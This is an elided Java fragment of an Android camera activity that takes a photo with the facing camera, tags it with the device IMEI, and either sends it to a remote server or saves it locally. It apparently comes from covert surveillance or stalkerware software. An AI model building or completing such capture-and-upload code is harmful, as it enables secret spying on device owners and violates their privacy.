...
public class CameraPhotoActivity extends Activity implements Runnable{
		...
		try{
			...
			if(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){//authority tips
				if(openFacingCamera()){
					...
					WriteDateFile.writeLogFile("openCamera Failed\r\n");
				}
			}
			else{
				CameraPhotoActivity.this.finish();
				Log.d(TAG, "camera not exist");
				WriteDateFile.writeLogFile("camera not exist\r\n");
			}
		}
		catch(Exception ex){
			try{
			...
			WriteDateFile.writeLogFile("initCamera exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
		}
	}
	...
	private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
		...
		public void onAutoFocus(boolean success, Camera camera) {
			try{
				...
				WriteDateFile.writeLogFile("camera auto focus error\r\n");
				ex.printStackTrace();
			}
		}
	};
	...
	private PictureCallback myPicCallback = new PictureCallback() {
		...
		public void onPictureTaken(byte[] data, Camera camera) {
			try {
		    	...
		    	WriteDateFile.writeLogFile("camera photo cost milliseconds:" + String.valueOf(camerausetime) + "\r\n");
				
				if (data.length < Public.VALID_CAMERAPHOTO_SIZE) {
					WriteDateFile.writeLogFile("camera photo size:" + data.length + " is ignormal\r\n");
					return;
				}
				...
				if(Network.isNetworkConnected(context) == true 
			    	...
			    	String filename = PublicFunction.formatCurrentDateInFileName() + "_" + ForegroundService.CAMERAPHOTO_FILE_NAME;
					...
					byte[] bytedatasize = PublicFunction.intToBytes(datasize);
					System.arraycopy(bytedatasize, 0, sendbuf, 4 + filenamelen, 4);
					System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);
			    	
					new Thread(new SendDataToServer(sendbuf,sendsize,Public.CMD_DATA_CAMERAPHOTO,Public.IMEI)).start();
				}else{
		        	String filename = PublicFunction.formatCurrentDateInFileName() + "_" + ForegroundService.CAMERAPHOTO_FILE_NAME;
		        	File pictureFile = new File(ForegroundService.LOCAL_PATH_NAME + filename);	
				...
				String errorString = ExceptionProcess.getExceptionDetail(error);
				String stackString = ExceptionProcess.getCallStack();
				WriteDateFile.writeLogFile("CameraPhotoActivity exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
				return ;
	        }
		}
	};
